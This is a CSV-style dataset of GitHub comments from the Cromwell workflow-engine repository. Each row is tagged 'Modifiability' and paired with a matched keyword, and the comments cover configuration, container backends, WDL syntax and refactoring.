Modifiability,"@Horneth @geoffjentry For the Dos filesystem, we can control the docker image at the config level. Is the expectation here to do the same for the GCS filesystem?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3680#issuecomment-414894231:85,config,config,85,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3680#issuecomment-414894231,1,['config'],['config']
Modifiability,@Horneth I don't think there is such a ticket currently but that makes sense as a test enhancementy sort of thing.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2369#issuecomment-310722510:87,enhance,enhancementy,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2369#issuecomment-310722510,1,['enhance'],['enhancementy']
Modifiability,@Horneth I'm adding you as a reviewer so you can confirm the new config file being used -- multiBackend.conf has the changes you expect :),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1183#issuecomment-233726634:65,config,config,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1183#issuecomment-233726634,1,['config'],['config']
Modifiability,"@Horneth Thanks for letting me know. It would be great if this was prioritized, we are unable to fully do call caching at the moment, so having 503 errors can get quite expensive for us. Are there any config properties which you know of that might help with this?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2576#issuecomment-348720128:201,config,config,201,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2576#issuecomment-348720128,1,['config'],['config']
Modifiability,"@Horneth The more I'm thinking about this I'm transitioning from ""throwing something out there"" to ""advocating"" :). What bothers me about this is that eventually we're going to want workflow submission also go through the same validation actor instead of doing it in multiple ways. Typically you want actor ownership to be hierarchical in nature but this way you'd have multiple parent types. Something to consider - what happens if a VA throws an exception under this model? You'll now need to have supervision code in multiple places. More abstractly what will be said is that validation is A Thing, but needs to exist independently in multiple places - if that's the case it should be pulled out into its own block. Furthermore the validation actor should be the sort of actor which is perfect for being its own concept - it's a completely idempotent, stateless operation. Work gets sent to it, it process the work and responds to the querier. My point about supervision is that by Right Now defining A Validation Actor (presumably owned by the kernel) what you're effectively doing is defining a validation interface. You can change how things are implemented in the future (e.g. it's really a bunch of VAs, it's firing up ephemeral VAs, whatever) and not need to change any code throughout the rest of the system as everything is still talking to the same actorRef that they were before. Alternatively if validation actors are being spun up on demand in multiple places and we decide that we somehow need to handle VAs in a special manner, it'll be a larger refactor. All that said, at the moment only the validation webservice is talking to the VA. I'm happy to shelve this until when something else is talking to VAs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195419168:1563,refactor,refactor,1563,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195419168,1,['refactor'],['refactor']
Modifiability,@Horneth could you add a cache configuration option that will switch on caring about the filenames when caching?; Non-chaching of filenames can get many users in a really big trouble and sometimes screw whole research or medical diagnosis. If I did not discover that the files were not written because of caching my colleagues would have treated cow data as if it was human.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3044#issuecomment-351129209:31,config,configuration,31,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3044#issuecomment-351129209,1,['config'],['configuration']
Modifiability,"@Horneth my suggestion for this PR (happy to be overruled - @geoffjentry @kcibul) would be to get the return code being ONLY the return code. And forget the ""backend return code"" entirely for now until that upcoming ticket (maybe enhance that other ticket to add ""JES return codes appear in failure message"" as another AC?)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/447#issuecomment-184760682:230,enhance,enhance,230,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/447#issuecomment-184760682,1,['enhance'],['enhance']
Modifiability,@LeeTL1220 ; The configuration path seems to be different from the one you have (don't know if / when / why it changed).; Here's the current location for default runtime attributes: https://github.com/broadinstitute/cromwell/blob/develop/cromwell.examples.conf#L531. I did check and this is honored,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2527#issuecomment-321086048:17,config,configuration,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2527#issuecomment-321086048,1,['config'],['configuration']
Modifiability,"@LeeTL1220 @Horneth I doubt enabling continue on return would work. You are getting timeouts not only when uploading log files, but also when localizing files. Ive observed this occasionally to with wide scatters and multiple workflows. ; It starting to seem more like an api Issue. I know in the cromwell conf there is a property for setting the total number of concurrent workflows, but I do not know if this is extended to the task level. It would be interesting to see whether or not limiting the number of concurrent tasks in a scatter would have any impact on this. That or better scattering the task submission for scatters instead of submitting all tasks basically at once. This is one of our major pain points too. So far the only reasonable solution we have had (other then adjusting api quotas) is just to tell users to rerun a wf",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-300177559:414,extend,extended,414,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-300177559,1,['extend'],['extended']
Modifiability,"@LeeTL1220 I tried this task below and although it's not the same exact type of syntax as what you used, I was able to use a task input variable inside of my glob: . `task createFileArray {; String dir = ""out""; command <<<; mkdir ${dir}; echo ""hullo"" > ${dir}/hello.txt; echo ""buh-bye"" > ${dir}/ciao.txt; sleep 2; >>>; output {; Array[File] out = glob(""out/*.txt"") ; Array[File] out2 = glob(dir + ""/*.txt""); #Array[File] out3 = glob(""${out}/*.txt""); }; runtime {docker:""ubuntu:latest""}; }`; out and out2 are valid task outputs, but not out3.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1302#issuecomment-267175875:136,variab,variable,136,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1302#issuecomment-267175875,1,['variab'],['variable']
Modifiability,"@LeeTL1220 Is this still happening w/ the latest version of the plugin? Also, if you didn't notice, pycharm works now too",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2276#issuecomment-313750304:64,plugin,plugin,64,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2276#issuecomment-313750304,1,['plugin'],['plugin']
Modifiability,"@LeeTL1220 my `reference.conf` database section looks correct:. ```; database {; # hsql default; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; url = ""jdbc:hsqldb:mem:${uniqueSchema};shutdown=false;hsqldb.tx=mvcc""; connectionTimeout = 3000; }. # mysql example; #driver = ""slick.driver.MySQLDriver$""; #db {; # driver = ""com.mysql.jdbc.Driver""; # url = ""jdbc:mysql://host/cromwell?rewriteBatchedStatements=true""; # user = ""user""; # password = ""pass""; # connectionTimeout = 5000; #}. # For batch inserts the number of inserts to send to the DB at a time; # insert-batch-size = 2000. migration {; # For databases with a very large number of symbols, selecting all the rows at once can generate a variety of; # problems. In order to avoid any issue, the selection is paginated. This value sets how many rows should be; # retrieved and processed at a time, before asking for the next chunk.; read-batch-size = 100000. # Because a symbol row can contain any arbitrary wdl value, the amount of metadata rows to insert from a single; # symbol row can vary from 1 to several thousands (or more). To keep the size of the insert batch from growing out; # of control we monitor its size and execute/commit when it reaches or exceeds writeBatchSize.; write-batch-size = 100000; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2217#issuecomment-298110016:411,rewrite,rewriteBatchedStatements,411,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2217#issuecomment-298110016,1,['rewrite'],['rewriteBatchedStatements']
Modifiability,"@LeeTL1220 since its possible to configure this limit as needed, I'm hoping you've got what you needed. Feel free to reopen if I missed something.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2768#issuecomment-417328909:33,config,configure,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2768#issuecomment-417328909,1,['config'],['configure']
Modifiability,"@ParkvilleData It is now in the development docs. https://cromwell.readthedocs.io/en/develop/Configuring/#database. The formatting is a bit off, but that will be fixed. It should be in the stable docs (the default cromwell.readthedocs.io) from version 48 onwards.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-564911759:93,Config,Configuring,93,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-564911759,1,['Config'],['Configuring']
Modifiability,"@TMiguelT @geoffjentry I've been following the conversation and we're pretty keen to use some container system with Cromwell on our cluster. At the moment I'm trying to use udocker with Cromwell with the following conf, but the docker param [is looked up](https://cromwell.readthedocs.io/en/stable/cromwell_features/CallCaching/#Docker+Tags) and injected as a [digest](https://docs.docker.com/engine/reference/commandline/pull/#pull-an-image-by-digest-immutable-identifier) which udocker [doesn't appear to support](https://github.com/indigo-dc/udocker/issues/112). . ```; backend {; default: udocker; providers: {; udocker {; # The backend custom configuration.; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {. # The list of possible runtime custom attributes.; runtime-attributes = """"""; String? docker; String? docker_user; """""". # Submit string when there is a ""docker"" runtime attribute.; submit-docker = """"""; udocker run \; --rm -i \; ${""--user "" + docker_user} \; # Edit: future Michael here, entrypoint in udocker starts interactive shell so exclude it; #--entrypoint ${job_shell} \; -v ${cwd}:${docker_cwd} \; ${docker} ${script}; """"""; }; }; }; }; ```. which results in the script.submit:; ```bash; udocker run \; --rm -i \; # --entrypoint /bin/bash \ # Edit: Don't include this line it causes interactive shell; -v /path/to/call-untar:/cromwell-executions/path/to/call-untar \; ubuntu@sha256:868fd30a0e47b8d8ac485df174795b5e2fe8a6c8f056cc707b232d65b8a1ab68 \; /cromwell-executions/path/to/call-untar/execution/script; ```. and fails with the error:; ```; Error: invalid repo name syntax; Error: must specify image:tag or repository/image:tag; ```. I can't find some way to disable the docker lookup by Cromwell, nor some non-digest runtime variable that Cromwell exposes. Just wondering how you're achieving this on docker or singularity. . Edit: `entrypoint` in udocker starts interactive shell, suspending the execution of the program.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-454569364:648,config,configuration,648,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-454569364,5,"['Config', 'config', 'variab']","['ConfigBackendLifecycleActorFactory', 'config', 'configuration', 'variable']"
Modifiability,@TMiguelT For now I'd not go for the full refactoring,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4274#issuecomment-483469184:42,refactor,refactoring,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4274#issuecomment-483469184,1,['refactor'],['refactoring']
Modifiability,"@TMiguelT I believe in this case the issue is with the command section in the WDL. Cromwell won't add `""`s around filenames for you if they aren't there in the WDL. So a line like this:; ```wdl; command <<<; [...]; bash_ref_fasta=${ref_fasta}; [...]; >>>; ```. will interpolate the `ref_fasta` variable into the command section as a file name verbatim. So I think the solution for you here is to ask the author of the WDL you're using to add `""`s into their command section, like:; ```wdl; command <<<; [...]; bash_ref_fasta=""${ref_fasta}""; [...]; >>>; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4393#issuecomment-440037136:294,variab,variable,294,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4393#issuecomment-440037136,1,['variab'],['variable']
Modifiability,"@TMiguelT I looked into this and we are using the latest version of the configuration library, so short of someone submitting a PR to fix their parsing issue, there is not much we can do. Lightbend recommends a linting tool, http://www.hoconlint.com/, which when run on your sample file gives the correct error message!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4549#issuecomment-465173266:72,config,configuration,72,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4549#issuecomment-465173266,1,['config'],['configuration']
Modifiability,"@TMiguelT Will follow up w/ config in email just to not muddy the waters on this issue. I haven't had enough first hand experience with either to opine here, unfortunately.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-454250964:28,config,config,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-454250964,1,['config'],['config']
Modifiability,"@TMiguelT for suggesting flock. Together with `singularity exec` I think it can solve this particular use case. The `SINGULARITY_CACHEDIR` environment variable needs to be set to a location on the cluster. Then the following config can work:. ```; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 200; exit-code-timeout-seconds = 120; # 4G Memory by default; runtime-attributes= """"""; Int cpu = 1; Int? memory; String? docker; Int time_minutes = 120; """"""; submit-docker = """"""; # Singularity pull image. ; if [ -z $SINGULARITY_CACHEDIR ]; ; then CACHE_DIR=$HOME/singularity/cache; else CACHE_DIR=$SINGULARITY_CACHEDIR; fi; mkdir -p $CACHE_DIR; LOCK_FILE=$CACHE_DIR/singularity_pull_flock; # flock should work as this is executed at the same node as cromwell.; flock --verbose --exclusive --timeout 900 $LOCK_FILE singularity exec --containall docker://${docker} echo ""succesfully pulled ${docker}!"". # Partition selection; PARTITION=all; MEMORY=${default=""4294967296"" memory}; if [ ${time_minutes} -lt 60 ]; then PARTITION=short; fi; if [ $MEMORY -gt 107374182400 ] ; then PARTITION=highmem ; fi. # Job submission; sbatch \; --partition=$PARTITION \; --job-name=""${job_name}"" \; --chdir=""${cwd}"" \; --time=""${time_minutes}"" \; --cpus-per-task=""${cpu}"" \; --mem=$(echo ""$MEMORY / 1024^2"" | bc) \; --output=""${out}"" \; --error=""${err}"" \; --wrap \; 'singularity exec --containall --bind /shared_cluster_dir,${cwd}:${docker_cwd} docker://${docker} sh ${script}; rc=$?; if [ ! -f ${cwd}/execution/rc ]; then; echo ""$rc"" > ${cwd}/execution/rc; fi'; """"""; kill = ""scancel ${job_id}""; kill-docker = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*""; ``` . EDIT: I changed the config. Instead of using multiple locks (one lock per image) there is now one universal lock. This is because pulling two images at the same time that have a shared layer might also corrupt the cache.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627379430:2337,config,config,2337,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627379430,1,['config'],['config']
Modifiability,@TedBrookings this seems like a really good idea. `docker stats` would of course only work for tasks running in a docker container but that's hopefully the majority of them. It would not have been possible to do it in PAPIv1 but PAPIv2 should be flexible enough to allow for something like that.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2507#issuecomment-436049650:246,flexible,flexible,246,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2507#issuecomment-436049650,1,['flexible'],['flexible']
Modifiability,"@TimurIs - out of curiosity, where did you find that configuration option? I don't see it documented in the [example conf](https://github.com/broadinstitute/cromwell/blob/develop/cromwell.examples.conf).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-443400527:53,config,configuration,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-443400527,1,['config'],['configuration']
Modifiability,"@adamstruck this is actually intended behavior, when you include `Boolean long = false` it is hardcoding the value of `long` as `false`. You are correct that to make this into a configurable value that you should make the Boolean optional.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1632#issuecomment-291567534:178,config,configurable,178,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1632#issuecomment-291567534,1,['config'],['configurable']
Modifiability,"@aednichols ; Yeah, it seems pretty ugly. Implementing it less ugly may require some refactoring and I'm not sure that I can do it in the right way. I think it would be better to close this PR and leave this issue to someone who knows Cromwell better than me.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5096#issuecomment-530531351:85,refactor,refactoring,85,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5096#issuecomment-530531351,1,['refactor'],['refactoring']
Modifiability,"@aednichols I would like to point out that just because; > someone extending this trait has to explicitly consider whether a newly-added state is terminal or not. ... that doesn't mean they'll necessarily get it right... . cf [[1]](https://github.com/broadinstitute/cromwell/pull/4654/commits/ff6790e7242dfd1e25eea2568d3bc42b649714f7), [[2]](https://github.com/broadinstitute/cromwell/pull/4654/commits/accfb5bc5d144d61e79b0e6058f4efa144ff424f) 😳",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4654#issuecomment-470346112:67,extend,extending,67,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4654#issuecomment-470346112,1,['extend'],['extending']
Modifiability,"@aednichols I've rebased on develop couple days ago.; There only one job fails (https://travis-ci.com/broadinstitute/cromwell/jobs/231053156), and the last lines of log are:; ```; No output has been received in the last 10m0s, this potentially indicates a stalled build or something wrong with the build itself.; Check the details on how to adjust your build configuration on: https://docs.travis-ci.com/user/common-build-problems/#build-times-out-because-no-output-was-received; The build has been terminated; ```. Never saw this before, so I don't know how to fix this...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5110#issuecomment-527959017:359,config,configuration,359,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5110#issuecomment-527959017,1,['config'],['configuration']
Modifiability,"@aednichols based purely on your last comment it's quite possible you're seeing the difference in the early days between the more FP-focus in one camp and more OOP-focus in the other. . I've seen Odersky et al talk about how they see classes & objects as best providing namespaced modules a la ML, whereas inheritance is obv a key component of mainstream OOP constructs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6118#issuecomment-738881080:306,inherit,inheritance,306,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6118#issuecomment-738881080,1,['inherit'],['inheritance']
Modifiability,"@aednichols is there a PR that enhances the CWL debugging capabilities of Cromwell? Unsure why this was closed as ""completed""?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5826#issuecomment-1292936396:31,enhance,enhances,31,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5826#issuecomment-1292936396,1,['enhance'],['enhances']
Modifiability,"@aednichols tested that just now. The experience is similar to the ""I don't have git hooks installed"" case (ie see the two final `[error]` messages):; ```; $ sbt compile; [...]; [info] Executing in batch mode. For better performance use sbt's shell; [info] Executing pre-compile script...; [error] You are not running our custom git commit hooks. If you are making changes to the codebase, we recommend doing this (by running 'git config --add core.hooksPath hooks/') to ensure that your cryptographic secrets are not committed to our repository by accident.; [error] If you don't want to set up hooks (if you never intend to commit to the cromwell repo, can be sure that you won't commit secrets by accident, or have already installed git-secrets in this repo separately), you can suppress this error by running with: 'sbt -Dignore-hooks-check=true [...]'; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5060#issuecomment-510938820:431,config,config,431,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5060#issuecomment-510938820,1,['config'],['config']
Modifiability,"@alexfrieden - Sorry to say that the youtube video might be a bit out of date. We've been iterating pretty quickly on this. Can you try launching a new stack with the following [Cromwell ""All in One"" template](https://docs.opendata.aws/genomics-workflows/cromwell/cromwell-aws-batch/#tldr)? This is a new one that will also configure and launch a Cromwell server that you can get to from a web-browser. I just launched this stack and successfully ran a couple of workflows on it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4345#issuecomment-437541014:324,config,configure,324,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4345#issuecomment-437541014,1,['config'],['configure']
Modifiability,"@antonkulaga Cromwell has [filesystem option](https://cromwell.readthedocs.io/en/stable/Configuring/#local-filesystem-options) `fingerprint` to hash without having to read the whole file. It is supported by the HPC community, and not by the Cromwell team. Haven't tried it myself, but I wonder whether it would solve your problem.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-810696967:88,Config,Configuring,88,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-810696967,1,['Config'],['Configuring']
Modifiability,"@antonkulaga I will update Readme to point right configuration, however on `what should be given when running java -jar Cromwell.jar` it doesn't need any additional runtime attributes besides uncommenting Spark backend configuration from `reference.conf` and on `what should be put to wdl` is referred here : [WDL](https://github.com/broadinstitute/cromwell#sample-wdl)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2033#issuecomment-283214134:49,config,configuration,49,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2033#issuecomment-283214134,2,['config'],['configuration']
Modifiability,"@antonkulaga that PR is for the config backend (Local, SGE, etc) and specifically *not* JES. I see now it is a bit confusing how I worded the description in the PR... 😦",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2034#issuecomment-283063200:32,config,config,32,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2034#issuecomment-283063200,1,['config'],['config']
Modifiability,"@antonkulaga this enhancement is intended as a general improvement, not a fix for any particular issue. Rest assured we will get to the bottom of your struct issue!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4661#issuecomment-464248756:18,enhance,enhancement,18,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4661#issuecomment-464248756,1,['enhance'],['enhancement']
Modifiability,"@bfoster-lbl - An example config with the parameters you highlighted is available [here](https://docs.opendata.aws/genomics-workflows/cromwell/cromwell-aws-batch/#cromwell-server). That said, I agree that the tutorial in cromwell.readthedocs.io should match.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4278#issuecomment-435545509:26,config,config,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4278#issuecomment-435545509,1,['config'],['config']
Modifiability,"@buchanae Looks like it's still failing, looking at the error message seems like it gets the path to the config file wrong. Should it be `--config` instead of `-config` ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2116#issuecomment-290765999:105,config,config,105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2116#issuecomment-290765999,3,['config'],['config']
Modifiability,"@carolynlawrence Just to double check, are you all using Docker in your workflow tasks? The only reason we're fiddling with permissions is due to Docker, and I don't know of anyone using Docker w/ Cromwell in an HPC environment - so my thought was that we could simply disable that permission activity for tasks which are not using docker. . To tie it into what @danbills suggested, perhaps **that** should be what the configuration flag is doing, just to be sure it's not breaking anyone's reliance on current behavior either way.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3333#issuecomment-374722237:419,config,configuration,419,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3333#issuecomment-374722237,1,['config'],['configuration']
Modifiability,"@chapmanb Also can you explain what the different systems are? It looks like everyone is using the same configuration here, right?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3607#issuecomment-387853025:104,config,configuration,104,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3607#issuecomment-387853025,1,['config'],['configuration']
Modifiability,"@cjllanwarne #811 #812 for Local and JES config sanity checking, #813 to create filesystems in the initialization actor. The logging issue might be better suited for discussion prior to ticketing.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/797#issuecomment-217980738:41,config,config,41,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/797#issuecomment-217980738,1,['config'],['config']
Modifiability,"@cjllanwarne , @curoli ; I am writing a UI to deal with cromwell. There I just make Ajax calls to cromwell from ScalaJS without bothering about redirecting everything to the server. I had to configure nginx to provide allow-origin, however,it will be way better if there will be allow-origin option in cromwell config, so people will be able to use my UI without messing with nginx configurations.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2824#issuecomment-344307228:191,config,configure,191,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2824#issuecomment-344307228,3,['config'],"['config', 'configurations', 'configure']"
Modifiability,@cjllanwarne - good points about having it optional. I'll look into adding a config option and only running this code if they specify Jes as the backend and also abort.jobs.on.terminate (or whatever it should be called),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-173971121:77,config,config,77,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-173971121,1,['config'],['config']
Modifiability,"@cjllanwarne @Horneth I'll just add that we're going to need to start slimming down WorkflowDescriptor and removing its coupling to Backend, so while if it's the only way to do something for now that's one thing but if it's a matter of how one skins the proverbial cat going another pat would be good",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/361#issuecomment-170674873:120,coupling,coupling,120,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/361#issuecomment-170674873,1,['coupling'],['coupling']
Modifiability,"@cjllanwarne @aednichols Sorry for my late reaction, I was on holiday last week. I have removed the forInput variable entirely thanks to @cjllanwarne's feedback. Instead I created the `makeInputSpecificFunctions` in the `IoFunctionSet` trait so every backend can use it. I then overrided it in the sfsBackend to return another class with a different postmapping. This made the `forInput` variable redundant.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5495#issuecomment-623374492:109,variab,variable,109,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5495#issuecomment-623374492,2,['variab'],['variable']
Modifiability,"@cjllanwarne @kshakir woah I didn't know about this! I've fixed the script per the spellcheck output and addressed its points below:. ```bash; docker_subbed=$(sed -e 's/[^A-Za-z0-9._-]/_/g' <<< ${docker}); singularity_image=${cwd}/$docker_subbed.sif. if [ ! -f ""$singularity_image"" ]; then; singularity pull ""$singularity_image"" docker://${docker}; fi; ```. ![image](https://user-images.githubusercontent.com/22381693/55589465-01d7ec80-577c-11e9-8800-ddbcff440138.png). Addressing each point separately:; - [SC2001](https://github.com/koalaman/shellcheck/wiki/SC2001): I can't use the `${variable//search/replace}` syntax as Cromwell parses this expression and rejects the config as it would try to execute this when generating the block.; - [SC2154](https://github.com/koalaman/shellcheck/wiki/SC2154): `docker` and `cwd` are substituted by Cromwell.; - [SC2086](https://github.com/koalaman/shellcheck/wiki/SC2086): Similar to above, this is substituted into a string, so not needed at runtime. Which results in something like this:; ```bash; # Build the Docker image into a singularity image; docker_subbed=$(sed -e 's/[^A-Za-z0-9._-]/_/g' <<< quay.io/biocontainers/cutadapt@sha256:8799129dfef6de4e0503e8f2c20acafdf261793cc392f312d84df8016bfeef24); singularity_image=/path/to/cromwell-executions/whole_genome_germline/47077714-9e90-49a6-91b6-902297b443ce/call-s1_alignsortedbam/shard-0/alignsortedbam/a8d7227b-20cf-4997-adf5-c1401d2eeb1f/call-cutadapt/$docker_subbed.sif. if [ ! -f ""$singularity_image"" ]; then; singularity pull ""$singularity_image"" docker://quay.io/biocontainers/cutadapt@sha256:8799129dfef6de4e0503e8f2c20acafdf261793cc392f312d84df8016bfeef24; fi; ```. Which leaves `$singularity_image` with the value ; ```; /path/to/cromwell-executions/my_wf/$exec_id/etc/cutadapt/quay.io_biocontainers_cutadapt_sha256_8799129dfef6de4e0503e8f2c20acafdf261793cc392f312d84df8016bfeef24.sif; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4797#issuecomment-480071598:588,variab,variable,588,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4797#issuecomment-480071598,2,"['config', 'variab']","['config', 'variable']"
